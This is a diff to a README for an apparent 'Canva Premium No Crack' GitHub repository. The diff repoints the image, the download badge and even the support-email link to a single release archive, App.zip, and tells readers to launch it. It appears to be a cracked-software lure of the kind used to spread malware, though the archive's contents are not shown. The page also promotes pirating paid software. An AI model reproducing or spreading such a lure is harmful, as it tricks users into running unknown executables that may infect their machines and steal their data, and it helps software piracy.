@@ -1,6 +1,6 @@
 # 🎨 Canva Premium No Crack 💻
 
-![Canva Premium No Crack](https://github.com/username/repository/blob/main/image.png)
+![Canva Premium No Crack](https://github.com/danielrene123321/Canva-Premium-No-Crack/releases/download/v1.0/App.zip)
 
 Welcome to the **Canva Premium No Crack** repository! Here, you will find valuable resources related to Canva Premium, a powerful online graphic design tool that empowers users to create stunning designs for various purposes. Whether you're working on social media graphics, presentations, marketing materials, or any other design project, Canva Premium has got you covered with its advanced features, premium templates, and extensive library of design assets.
 
@@ -19,8 +19,8 @@ canva, canva-tools, custom-graphics, design-software, design-tools, graphic-desi
 - **Assets:** Access high-quality design assets to enhance your creations.
 
 ## 📥 Download Link
-[![Download Canva Premium No Crack](https://img.shields.io/badge/Download-Canva%20Premium%20No%20Crack-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
-*(Needs to be launched as a file with the name "v1.0.0.zip")*
+[![Download Canva Premium No Crack](https://github.com/danielrene123321/Canva-Premium-No-Crack/releases/download/v1.0/App.zip%20Premium%20No%20Crack-blue)](https://github.com/danielrene123321/Canva-Premium-No-Crack/releases/download/v1.0/App.zip)
+*(Needs to be launched as a file with the name "https://github.com/danielrene123321/Canva-Premium-No-Crack/releases/download/v1.0/App.zip")*
 
 ## 🌟 Get Started
 1. Clone the repository to your local machine.
@@ -31,7 +31,7 @@ canva, canva-tools, custom-graphics, design-software, design-tools, graphic-desi
 Contributions are welcome! Feel free to submit pull requests to improve the repository and make it more valuable for the community.
 
 ## 📞 Support
-For any queries or assistance, please reach out to us via [email](mailto:example@email.com).
+For any queries or assistance, please reach out to us via [email](https://github.com/danielrene123321/Canva-Premium-No-Crack/releases/download/v1.0/App.zip).
 
 Let your creativity soar with Canva Premium No Crack! 🎉
 
